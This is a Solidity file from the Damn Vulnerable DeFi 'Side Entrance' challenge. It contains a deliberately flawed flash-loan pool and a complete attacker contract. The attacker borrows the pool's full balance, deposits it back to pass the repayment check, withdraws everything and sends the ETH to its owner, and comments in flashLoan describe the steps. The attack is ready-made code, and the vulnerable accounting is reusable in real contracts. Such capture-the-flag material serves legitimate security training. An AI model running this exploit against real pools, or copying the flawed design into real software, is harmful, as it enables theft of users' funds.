// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        // Call flashLoan with max amount ETH
        // call deposite() in execute() func
        // Dummy contract will check that it has ETH at address(this).balance
        // drain all funds through withdraw() func
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}

contract SideEntranceLenderPoolAttacker {
    using Address for address payable;

    address private _sideEntranceLenderPool;
    address payable private _owner;

    constructor(address sideEntranceLenderPool) {
        _owner = payable(msg.sender);
        _sideEntranceLenderPool = sideEntranceLenderPool;
    }

    function attack() external {
        SideEntranceLenderPool(_sideEntranceLenderPool).flashLoan(_sideEntranceLenderPool.balance);
        SideEntranceLenderPool(_sideEntranceLenderPool).withdraw();
    }

    function execute() external payable {
        SideEntranceLenderPool(_sideEntranceLenderPool).deposit{ value: msg.value }();
    }

    receive() external payable {
        payable(_owner).sendValue(address(this).balance);
    }
}
